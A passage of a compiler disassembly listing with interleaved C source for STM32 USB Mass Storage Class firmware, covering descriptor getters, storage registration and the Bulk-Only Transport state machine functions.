  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
uint8_t *USBD_MSC_GetOtherSpeedCfgDesc(uint16_t *length)
{
 80093a4:	b580      	push	{r7, lr}
 80093a6:	b084      	sub	sp, #16
 80093a8:	af00      	add	r7, sp, #0
 80093aa:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPIN_ADDR);
 80093ac:	2181      	movs	r1, #129	; 0x81
 80093ae:	4812      	ldr	r0, [pc, #72]	; (80093f8 <USBD_MSC_GetOtherSpeedCfgDesc+0x54>)
 80093b0:	f002 f970 	bl	800b694 <USBD_GetEpDesc>
 80093b4:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPOUT_ADDR);
 80093b6:	2101      	movs	r1, #1
 80093b8:	480f      	ldr	r0, [pc, #60]	; (80093f8 <USBD_MSC_GetOtherSpeedCfgDesc+0x54>)
 80093ba:	f002 f96b 	bl	800b694 <USBD_GetEpDesc>
 80093be:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 80093c0:	68fb      	ldr	r3, [r7, #12]
 80093c2:	2b00      	cmp	r3, #0
 80093c4:	d006      	beq.n	80093d4 <USBD_MSC_GetOtherSpeedCfgDesc+0x30>
  {
    pEpInDesc->wMaxPacketSize = MSC_MAX_FS_PACKET;
 80093c6:	68fb      	ldr	r3, [r7, #12]
 80093c8:	2200      	movs	r2, #0
 80093ca:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 80093ce:	711a      	strb	r2, [r3, #4]
 80093d0:	2200      	movs	r2, #0
 80093d2:	715a      	strb	r2, [r3, #5]
  }

  if (pEpOutDesc != NULL)
 80093d4:	68bb      	ldr	r3, [r7, #8]
 80093d6:	2b00      	cmp	r3, #0
 80093d8:	d006      	beq.n	80093e8 <USBD_MSC_GetOtherSpeedCfgDesc+0x44>
  {
    pEpOutDesc->wMaxPacketSize = MSC_MAX_FS_PACKET;
 80093da:	68bb      	ldr	r3, [r7, #8]
 80093dc:	2200      	movs	r2, #0
 80093de:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 80093e2:	711a      	strb	r2, [r3, #4]
 80093e4:	2200      	movs	r2, #0
 80093e6:	715a      	strb	r2, [r3, #5]
  }

  *length = (uint16_t)sizeof(USBD_MSC_CfgDesc);
 80093e8:	687b      	ldr	r3, [r7, #4]
 80093ea:	2220      	movs	r2, #32
 80093ec:	801a      	strh	r2, [r3, #0]
  return USBD_MSC_CfgDesc;
 80093ee:	4b02      	ldr	r3, [pc, #8]	; (80093f8 <USBD_MSC_GetOtherSpeedCfgDesc+0x54>)
}
 80093f0:	4618      	mov	r0, r3
 80093f2:	3710      	adds	r7, #16
 80093f4:	46bd      	mov	sp, r7
 80093f6:	bd80      	pop	{r7, pc}
 80093f8:	200000e0 	.word	0x200000e0

080093fc <USBD_MSC_GetDeviceQualifierDescriptor>:
  *         return Device Qualifier descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
uint8_t *USBD_MSC_GetDeviceQualifierDescriptor(uint16_t *length)
{
 80093fc:	b480      	push	{r7}
 80093fe:	b083      	sub	sp, #12
 8009400:	af00      	add	r7, sp, #0
 8009402:	6078      	str	r0, [r7, #4]
  *length = (uint16_t)sizeof(USBD_MSC_DeviceQualifierDesc);
 8009404:	687b      	ldr	r3, [r7, #4]
 8009406:	220a      	movs	r2, #10
 8009408:	801a      	strh	r2, [r3, #0]

  return USBD_MSC_DeviceQualifierDesc;
 800940a:	4b03      	ldr	r3, [pc, #12]	; (8009418 <USBD_MSC_GetDeviceQualifierDescriptor+0x1c>)
}
 800940c:	4618      	mov	r0, r3
 800940e:	370c      	adds	r7, #12
 8009410:	46bd      	mov	sp, r7
 8009412:	f85d 7b04 	ldr.w	r7, [sp], #4
 8009416:	4770      	bx	lr
 8009418:	20000100 	.word	0x20000100

0800941c <USBD_MSC_RegisterStorage>:
  * @brief  USBD_MSC_RegisterStorage
  * @param  fops: storage callback
  * @retval status
  */
uint8_t USBD_MSC_RegisterStorage(USBD_HandleTypeDef *pdev, USBD_StorageTypeDef *fops)
{
 800941c:	b480      	push	{r7}
 800941e:	b083      	sub	sp, #12
 8009420:	af00      	add	r7, sp, #0
 8009422:	6078      	str	r0, [r7, #4]
 8009424:	6039      	str	r1, [r7, #0]
  if (fops == NULL)
 8009426:	683b      	ldr	r3, [r7, #0]
 8009428:	2b00      	cmp	r3, #0
 800942a:	d101      	bne.n	8009430 <USBD_MSC_RegisterStorage+0x14>
  {
    return (uint8_t)USBD_FAIL;
 800942c:	2303      	movs	r3, #3
 800942e:	e009      	b.n	8009444 <USBD_MSC_RegisterStorage+0x28>
  }

  pdev->pUserData[pdev->classId] = fops;
 8009430:	687b      	ldr	r3, [r7, #4]
 8009432:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009436:	687a      	ldr	r2, [r7, #4]
 8009438:	33b0      	adds	r3, #176	; 0xb0
 800943a:	009b      	lsls	r3, r3, #2
 800943c:	4413      	add	r3, r2
 800943e:	683a      	ldr	r2, [r7, #0]
 8009440:	605a      	str	r2, [r3, #4]

  return (uint8_t)USBD_OK;
 8009442:	2300      	movs	r3, #0
}
 8009444:	4618      	mov	r0, r3
 8009446:	370c      	adds	r7, #12
 8009448:	46bd      	mov	sp, r7
 800944a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800944e:	4770      	bx	lr

08009450 <MSC_BOT_Init>:
  *         Initialize the BOT Process
  * @param  pdev: device instance
  * @retval None
  */
void MSC_BOT_Init(USBD_HandleTypeDef *pdev)
{
 8009450:	b580      	push	{r7, lr}
 8009452:	b084      	sub	sp, #16
 8009454:	af00      	add	r7, sp, #0
 8009456:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009458:	687b      	ldr	r3, [r7, #4]
 800945a:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800945e:	687b      	ldr	r3, [r7, #4]
 8009460:	32b0      	adds	r2, #176	; 0xb0
 8009462:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009466:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8009468:	68fb      	ldr	r3, [r7, #12]
 800946a:	2b00      	cmp	r3, #0
 800946c:	d039      	beq.n	80094e2 <MSC_BOT_Init+0x92>
  {
    return;
  }

  hmsc->bot_state = USBD_BOT_IDLE;
 800946e:	68fb      	ldr	r3, [r7, #12]
 8009470:	2200      	movs	r2, #0
 8009472:	721a      	strb	r2, [r3, #8]
  hmsc->bot_status = USBD_BOT_STATUS_NORMAL;
 8009474:	68fb      	ldr	r3, [r7, #12]
 8009476:	2200      	movs	r2, #0
 8009478:	725a      	strb	r2, [r3, #9]

  hmsc->scsi_sense_tail = 0U;
 800947a:	68fb      	ldr	r3, [r7, #12]
 800947c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009480:	2200      	movs	r2, #0
 8009482:	f883 2061 	strb.w	r2, [r3, #97]	; 0x61
  hmsc->scsi_sense_head = 0U;
 8009486:	68fb      	ldr	r3, [r7, #12]
 8009488:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800948c:	2200      	movs	r2, #0
 800948e:	f883 2060 	strb.w	r2, [r3, #96]	; 0x60
  hmsc->scsi_medium_state = SCSI_MEDIUM_UNLOCKED;
 8009492:	68fb      	ldr	r3, [r7, #12]
 8009494:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009498:	2200      	movs	r2, #0
 800949a:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62

  ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Init(0U);
 800949e:	687b      	ldr	r3, [r7, #4]
 80094a0:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 80094a4:	687a      	ldr	r2, [r7, #4]
 80094a6:	33b0      	adds	r3, #176	; 0xb0
 80094a8:	009b      	lsls	r3, r3, #2
 80094aa:	4413      	add	r3, r2
 80094ac:	685b      	ldr	r3, [r3, #4]
 80094ae:	681b      	ldr	r3, [r3, #0]
 80094b0:	2000      	movs	r0, #0
 80094b2:	4798      	blx	r3

  (void)USBD_LL_FlushEP(pdev, MSCOutEpAdd);
 80094b4:	4b0d      	ldr	r3, [pc, #52]	; (80094ec <MSC_BOT_Init+0x9c>)
 80094b6:	781b      	ldrb	r3, [r3, #0]
 80094b8:	4619      	mov	r1, r3
 80094ba:	6878      	ldr	r0, [r7, #4]
 80094bc:	f003 fc8a 	bl	800cdd4 <USBD_LL_FlushEP>
  (void)USBD_LL_FlushEP(pdev, MSCInEpAdd);
 80094c0:	4b0b      	ldr	r3, [pc, #44]	; (80094f0 <MSC_BOT_Init+0xa0>)
 80094c2:	781b      	ldrb	r3, [r3, #0]
 80094c4:	4619      	mov	r1, r3
 80094c6:	6878      	ldr	r0, [r7, #4]
 80094c8:	f003 fc84 	bl	800cdd4 <USBD_LL_FlushEP>

  /* Prepare EP to Receive First BOT Cmd */
  (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, (uint8_t *)&hmsc->cbw,
 80094cc:	4b07      	ldr	r3, [pc, #28]	; (80094ec <MSC_BOT_Init+0x9c>)
 80094ce:	7819      	ldrb	r1, [r3, #0]
 80094d0:	68fb      	ldr	r3, [r7, #12]
 80094d2:	f503 5280 	add.w	r2, r3, #4096	; 0x1000
 80094d6:	3210      	adds	r2, #16
 80094d8:	231f      	movs	r3, #31
 80094da:	6878      	ldr	r0, [r7, #4]
 80094dc:	f003 fdb8 	bl	800d050 <USBD_LL_PrepareReceive>
 80094e0:	e000      	b.n	80094e4 <MSC_BOT_Init+0x94>
    return;
 80094e2:	bf00      	nop
                               USBD_BOT_CBW_LENGTH);
}
 80094e4:	3710      	adds	r7, #16
 80094e6:	46bd      	mov	sp, r7
 80094e8:	bd80      	pop	{r7, pc}
 80094ea:	bf00      	nop
 80094ec:	2000010b 	.word	0x2000010b
 80094f0:	2000010a 	.word	0x2000010a

080094f4 <MSC_BOT_Reset>:
  *         Reset the BOT Machine
  * @param  pdev: device instance
  * @retval  None
  */
void MSC_BOT_Reset(USBD_HandleTypeDef *pdev)
{
 80094f4:	b580      	push	{r7, lr}
 80094f6:	b084      	sub	sp, #16
 80094f8:	af00      	add	r7, sp, #0
 80094fa:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80094fc:	687b      	ldr	r3, [r7, #4]
 80094fe:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009502:	687b      	ldr	r3, [r7, #4]
 8009504:	32b0      	adds	r2, #176	; 0xb0
 8009506:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800950a:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 800950c:	68fb      	ldr	r3, [r7, #12]
 800950e:	2b00      	cmp	r3, #0
 8009510:	d01c      	beq.n	800954c <MSC_BOT_Reset+0x58>
  {
    return;
  }

  hmsc->bot_state  = USBD_BOT_IDLE;
 8009512:	68fb      	ldr	r3, [r7, #12]
 8009514:	2200      	movs	r2, #0
 8009516:	721a      	strb	r2, [r3, #8]
  hmsc->bot_status = USBD_BOT_STATUS_RECOVERY;
 8009518:	68fb      	ldr	r3, [r7, #12]
 800951a:	2201      	movs	r2, #1
 800951c:	725a      	strb	r2, [r3, #9]

  (void)USBD_LL_ClearStallEP(pdev, MSCInEpAdd);
 800951e:	4b0d      	ldr	r3, [pc, #52]	; (8009554 <MSC_BOT_Reset+0x60>)
 8009520:	781b      	ldrb	r3, [r3, #0]
 8009522:	4619      	mov	r1, r3
 8009524:	6878      	ldr	r0, [r7, #4]
 8009526:	f003 fcc1 	bl	800ceac <USBD_LL_ClearStallEP>
  (void)USBD_LL_ClearStallEP(pdev, MSCOutEpAdd);
 800952a:	4b0b      	ldr	r3, [pc, #44]	; (8009558 <MSC_BOT_Reset+0x64>)
 800952c:	781b      	ldrb	r3, [r3, #0]
 800952e:	4619      	mov	r1, r3
 8009530:	6878      	ldr	r0, [r7, #4]
 8009532:	f003 fcbb 	bl	800ceac <USBD_LL_ClearStallEP>

  /* Prepare EP to Receive First BOT Cmd */
  (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, (uint8_t *)&hmsc->cbw,
 8009536:	4b08      	ldr	r3, [pc, #32]	; (8009558 <MSC_BOT_Reset+0x64>)
 8009538:	7819      	ldrb	r1, [r3, #0]
 800953a:	68fb      	ldr	r3, [r7, #12]
 800953c:	f503 5280 	add.w	r2, r3, #4096	; 0x1000
 8009540:	3210      	adds	r2, #16
 8009542:	231f      	movs	r3, #31
 8009544:	6878      	ldr	r0, [r7, #4]
 8009546:	f003 fd83 	bl	800d050 <USBD_LL_PrepareReceive>
 800954a:	e000      	b.n	800954e <MSC_BOT_Reset+0x5a>
    return;
 800954c:	bf00      	nop
                               USBD_BOT_CBW_LENGTH);
}
 800954e:	3710      	adds	r7, #16
 8009550:	46bd      	mov	sp, r7
 8009552:	bd80      	pop	{r7, pc}
 8009554:	2000010a 	.word	0x2000010a
 8009558:	2000010b 	.word	0x2000010b

0800955c <MSC_BOT_DeInit>:
  *         DeInitialize the BOT Machine
  * @param  pdev: device instance
  * @retval None
  */
void MSC_BOT_DeInit(USBD_HandleTypeDef  *pdev)
{
 800955c:	b480      	push	{r7}
 800955e:	b085      	sub	sp, #20
 8009560:	af00      	add	r7, sp, #0
 8009562:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009564:	687b      	ldr	r3, [r7, #4]
 8009566:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800956a:	687b      	ldr	r3, [r7, #4]
 800956c:	32b0      	adds	r2, #176	; 0xb0
 800956e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009572:	60fb      	str	r3, [r7, #12]

  if (hmsc != NULL)
 8009574:	68fb      	ldr	r3, [r7, #12]
 8009576:	2b00      	cmp	r3, #0
 8009578:	d002      	beq.n	8009580 <MSC_BOT_DeInit+0x24>
  {
    hmsc->bot_state = USBD_BOT_IDLE;
 800957a:	68fb      	ldr	r3, [r7, #12]
 800957c:	2200      	movs	r2, #0
 800957e:	721a      	strb	r2, [r3, #8]
  }
}
 8009580:	bf00      	nop
 8009582:	3714      	adds	r7, #20
 8009584:	46bd      	mov	sp, r7
 8009586:	f85d 7b04 	ldr.w	r7, [sp], #4
 800958a:	4770      	bx	lr

0800958c <MSC_BOT_DataIn>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval None
  */
void MSC_BOT_DataIn(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 800958c:	b580      	push	{r7, lr}
 800958e:	b084      	sub	sp, #16
 8009590:	af00      	add	r7, sp, #0
 8009592:	6078      	str	r0, [r7, #4]
 8009594:	460b      	mov	r3, r1
 8009596:	70fb      	strb	r3, [r7, #3]
  UNUSED(epnum);

  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009598:	687b      	ldr	r3, [r7, #4]
 800959a:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800959e:	687b      	ldr	r3, [r7, #4]
 80095a0:	32b0      	adds	r2, #176	; 0xb0
 80095a2:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80095a6:	60fb      	str	r3, [r7, #12]

  if (hmsc == NULL)
 80095a8:	68fb      	ldr	r3, [r7, #12]
 80095aa:	2b00      	cmp	r3, #0
 80095ac:	d022      	beq.n	80095f4 <MSC_BOT_DataIn+0x68>
  {
    return;
  }

  switch (hmsc->bot_state)
 80095ae:	68fb      	ldr	r3, [r7, #12]
 80095b0:	7a1b      	ldrb	r3, [r3, #8]
 80095b2:	2b02      	cmp	r3, #2
 80095b4:	d005      	beq.n	80095c2 <MSC_BOT_DataIn+0x36>
 80095b6:	2b02      	cmp	r3, #2
 80095b8:	db1e      	blt.n	80095f8 <MSC_BOT_DataIn+0x6c>
 80095ba:	3b03      	subs	r3, #3
 80095bc:	2b01      	cmp	r3, #1
 80095be:	d81b      	bhi.n	80095f8 <MSC_BOT_DataIn+0x6c>
 80095c0:	e013      	b.n	80095ea <MSC_BOT_DataIn+0x5e>
  {
    case USBD_BOT_DATA_IN:
      if (SCSI_ProcessCmd(pdev, hmsc->cbw.bLUN, &hmsc->cbw.CB[0]) < 0)
 80095c2:	68fb      	ldr	r3, [r7, #12]
 80095c4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80095c8:	7f59      	ldrb	r1, [r3, #29]
 80095ca:	68fb      	ldr	r3, [r7, #12]
 80095cc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80095d0:	331f      	adds	r3, #31
 80095d2:	461a      	mov	r2, r3
 80095d4:	6878      	ldr	r0, [r7, #4]
 80095d6:	f000 f9e5 	bl	80099a4 <SCSI_ProcessCmd>
 80095da:	4603      	mov	r3, r0
 80095dc:	2b00      	cmp	r3, #0
 80095de:	da0d      	bge.n	80095fc <MSC_BOT_DataIn+0x70>
      {
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
 80095e0:	2101      	movs	r1, #1
 80095e2:	6878      	ldr	r0, [r7, #4]
 80095e4:	f000 f920 	bl	8009828 <MSC_BOT_SendCSW>
      }
      break;
 80095e8:	e008      	b.n	80095fc <MSC_BOT_DataIn+0x70>

    case USBD_BOT_SEND_DATA:
    case USBD_BOT_LAST_DATA_IN:
      MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_PASSED);
 80095ea:	2100      	movs	r1, #0
 80095ec:	6878      	ldr	r0, [r7, #4]
 80095ee:	f000 f91b 	bl	8009828 <MSC_BOT_SendCSW>
      break;
 80095f2:	e004      	b.n	80095fe <MSC_BOT_DataIn+0x72>
    return;
 80095f4:	bf00      	nop
 80095f6:	e002      	b.n	80095fe <MSC_BOT_DataIn+0x72>

    default:
      break;
 80095f8:	bf00      	nop
 80095fa:	e000      	b.n	80095fe <MSC_BOT_DataIn+0x72>
      break;
 80095fc:	bf00      	nop
  }
}
 80095fe:	3710      	adds	r7, #16
 8009600:	46bd      	mov	sp, r7
 8009602:	bd80      	pop	{r7, pc}

08009604 <MSC_BOT_DataOut>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval None
  */
void MSC_BOT_DataOut(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 8009604:	b580      	push	{r7, lr}
 8009606:	b084      	sub	sp, #16
 8009608:	af00      	add	r7, sp, #0
 800960a:	6078      	str	r0, [r7, #4]
 800960c:	460b      	mov	r3, r1
 800960e:	70fb      	strb	r3, [r7, #3]
  UNUSED(epnum);

  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009610:	687b      	ldr	r3, [r7, #4]
 8009612:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009616:	687b      	ldr	r3, [r7, #4]
 8009618:	32b0      	adds	r2, #176	; 0xb0
 800961a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800961e:	60fb      	str	r3, [r7, #12]

  if (hmsc == NULL)
 8009620:	68fb      	ldr	r3, [r7, #12]
 8009622:	2b00      	cmp	r3, #0
 8009624:	d01e      	beq.n	8009664 <MSC_BOT_DataOut+0x60>
  {
    return;
  }

  switch (hmsc->bot_state)
 8009626:	68fb      	ldr	r3, [r7, #12]
 8009628:	7a1b      	ldrb	r3, [r3, #8]
 800962a:	2b00      	cmp	r3, #0
 800962c:	d002      	beq.n	8009634 <MSC_BOT_DataOut+0x30>
 800962e:	2b01      	cmp	r3, #1
 8009630:	d004      	beq.n	800963c <MSC_BOT_DataOut+0x38>
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
      }
      break;

    default:
      break;
 8009632:	e01a      	b.n	800966a <MSC_BOT_DataOut+0x66>
      MSC_BOT_CBW_Decode(pdev);
 8009634:	6878      	ldr	r0, [r7, #4]
 8009636:	f000 f81b 	bl	8009670 <MSC_BOT_CBW_Decode>
      break;
 800963a:	e016      	b.n	800966a <MSC_BOT_DataOut+0x66>
      if (SCSI_ProcessCmd(pdev, hmsc->cbw.bLUN, &hmsc->cbw.CB[0]) < 0)
 800963c:	68fb      	ldr	r3, [r7, #12]
 800963e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009642:	7f59      	ldrb	r1, [r3, #29]
 8009644:	68fb      	ldr	r3, [r7, #12]
 8009646:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800964a:	331f      	adds	r3, #31
 800964c:	461a      	mov	r2, r3
 800964e:	6878      	ldr	r0, [r7, #4]
 8009650:	f000 f9a8 	bl	80099a4 <SCSI_ProcessCmd>
 8009654:	4603      	mov	r3, r0
 8009656:	2b00      	cmp	r3, #0
 8009658:	da06      	bge.n	8009668 <MSC_BOT_DataOut+0x64>
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
 800965a:	2101      	movs	r1, #1
 800965c:	6878      	ldr	r0, [r7, #4]
 800965e:	f000 f8e3 	bl	8009828 <MSC_BOT_SendCSW>
      break;
 8009662:	e001      	b.n	8009668 <MSC_BOT_DataOut+0x64>
    return;
 8009664:	bf00      	nop
 8009666:	e000      	b.n	800966a <MSC_BOT_DataOut+0x66>
      break;
 8009668:	bf00      	nop
  }
}
 800966a:	3710      	adds	r7, #16
 800966c:	46bd      	mov	sp, r7
 800966e:	bd80      	pop	{r7, pc}

08009670 <MSC_BOT_CBW_Decode>:
  *         Decode the CBW command and set the BOT state machine accordingly
  * @param  pdev: device instance
  * @retval None
  */
static void  MSC_BOT_CBW_Decode(USBD_HandleTypeDef *pdev)
{
 8009670:	b580      	push	{r7, lr}
 8009672:	b084      	sub	sp, #16
 8009674:	af00      	add	r7, sp, #0
 8009676:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009678:	687b      	ldr	r3, [r7, #4]
 800967a:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800967e:	687b      	ldr	r3, [r7, #4]
 8009680:	32b0      	adds	r2, #176	; 0xb0
 8009682:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009686:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8009688:	68fb      	ldr	r3, [r7, #12]
 800968a:	2b00      	cmp	r3, #0
 800968c:	f000 8085 	beq.w	800979a <MSC_BOT_CBW_Decode+0x12a>
  {
    return;
  }

  hmsc->csw.dTag = hmsc->cbw.dTag;
 8009690:	68fb      	ldr	r3, [r7, #12]
 8009692:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009696:	695b      	ldr	r3, [r3, #20]
 8009698:	68fa      	ldr	r2, [r7, #12]
 800969a:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800969e:	6353      	str	r3, [r2, #52]	; 0x34
  hmsc->csw.dDataResidue = hmsc->cbw.dDataLength;
 80096a0:	68fb      	ldr	r3, [r7, #12]
 80096a2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80096a6:	699b      	ldr	r3, [r3, #24]
 80096a8:	68fa      	ldr	r2, [r7, #12]
 80096aa:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 80096ae:	6393      	str	r3, [r2, #56]	; 0x38

  if ((USBD_LL_GetRxDataSize(pdev, MSCOutEpAdd) != USBD_BOT_CBW_LENGTH) ||
 80096b0:	4b3d      	ldr	r3, [pc, #244]	; (80097a8 <MSC_BOT_CBW_Decode+0x138>)
 80096b2:	781b      	ldrb	r3, [r3, #0]
 80096b4:	4619      	mov	r1, r3
 80096b6:	6878      	ldr	r0, [r7, #4]
 80096b8:	f003 fd02 	bl	800d0c0 <USBD_LL_GetRxDataSize>
 80096bc:	4603      	mov	r3, r0
 80096be:	2b1f      	cmp	r3, #31
 80096c0:	d118      	bne.n	80096f4 <MSC_BOT_CBW_Decode+0x84>
      (hmsc->cbw.dSignature != USBD_BOT_CBW_SIGNATURE) ||
 80096c2:	68fb      	ldr	r3, [r7, #12]
 80096c4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80096c8:	691b      	ldr	r3, [r3, #16]
  if ((USBD_LL_GetRxDataSize(pdev, MSCOutEpAdd) != USBD_BOT_CBW_LENGTH) ||
 80096ca:	4a38      	ldr	r2, [pc, #224]	; (80097ac <MSC_BOT_CBW_Decode+0x13c>)
 80096cc:	4293      	cmp	r3, r2
 80096ce:	d111      	bne.n	80096f4 <MSC_BOT_CBW_Decode+0x84>
      (hmsc->cbw.bLUN > 1U) || (hmsc->cbw.bCBLength < 1U) ||
 80096d0:	68fb      	ldr	r3, [r7, #12]
 80096d2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80096d6:	7f5b      	ldrb	r3, [r3, #29]
      (hmsc->cbw.dSignature != USBD_BOT_CBW_SIGNATURE) ||
 80096d8:	2b01      	cmp	r3, #1
 80096da:	d80b      	bhi.n	80096f4 <MSC_BOT_CBW_Decode+0x84>
      (hmsc->cbw.bLUN > 1U) || (hmsc->cbw.bCBLength < 1U) ||
 80096dc:	68fb      	ldr	r3, [r7, #12]
 80096de:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80096e2:	7f9b      	ldrb	r3, [r3, #30]
 80096e4:	2b00      	cmp	r3, #0
 80096e6:	d005      	beq.n	80096f4 <MSC_BOT_CBW_Decode+0x84>
      (hmsc->cbw.bCBLength > 16U))
 80096e8:	68fb      	ldr	r3, [r7, #12]
 80096ea:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80096ee:	7f9b      	ldrb	r3, [r3, #30]
      (hmsc->cbw.bLUN > 1U) || (hmsc->cbw.bCBLength < 1U) ||
 80096f0:	2b10      	cmp	r3, #16
 80096f2:	d90f      	bls.n	8009714 <MSC_BOT_CBW_Decode+0xa4>
  {
    SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 80096f4:	68fb      	ldr	r3, [r7, #12]
 80096f6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80096fa:	7f59      	ldrb	r1, [r3, #29]
 80096fc:	2320      	movs	r3, #32
 80096fe:	2205      	movs	r2, #5
 8009700:	6878      	ldr	r0, [r7, #4]
 8009702:	f000 fe7b 	bl	800a3fc <SCSI_SenseCode>

    hmsc->bot_status = USBD_BOT_STATUS_ERROR;
 8009706:	68fb      	ldr	r3, [r7, #12]
 8009708:	2202      	movs	r2, #2
 800970a:	725a      	strb	r2, [r3, #9]
    MSC_BOT_Abort(pdev);
 800970c:	6878      	ldr	r0, [r7, #4]
 800970e:	f000 f8cb 	bl	80098a8 <MSC_BOT_Abort>
 8009712:	e045      	b.n	80097a0 <MSC_BOT_CBW_Decode+0x130>
  }
  else
  {
    if (SCSI_ProcessCmd(pdev, hmsc->cbw.bLUN, &hmsc->cbw.CB[0]) < 0)
 8009714:	68fb      	ldr	r3, [r7, #12]
 8009716:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800971a:	7f59      	ldrb	r1, [r3, #29]
 800971c:	68fb      	ldr	r3, [r7, #12]
 800971e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009722:	331f      	adds	r3, #31
 8009724:	461a      	mov	r2, r3
 8009726:	6878      	ldr	r0, [r7, #4]
 8009728:	f000 f93c 	bl	80099a4 <SCSI_ProcessCmd>
 800972c:	4603      	mov	r3, r0
 800972e:	2b00      	cmp	r3, #0
 8009730:	da0c      	bge.n	800974c <MSC_BOT_CBW_Decode+0xdc>
    {
      if (hmsc->bot_state == USBD_BOT_NO_DATA)
 8009732:	68fb      	ldr	r3, [r7, #12]
 8009734:	7a1b      	ldrb	r3, [r3, #8]
 8009736:	2b05      	cmp	r3, #5
 8009738:	d104      	bne.n	8009744 <MSC_BOT_CBW_Decode+0xd4>
      {
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
 800973a:	2101      	movs	r1, #1
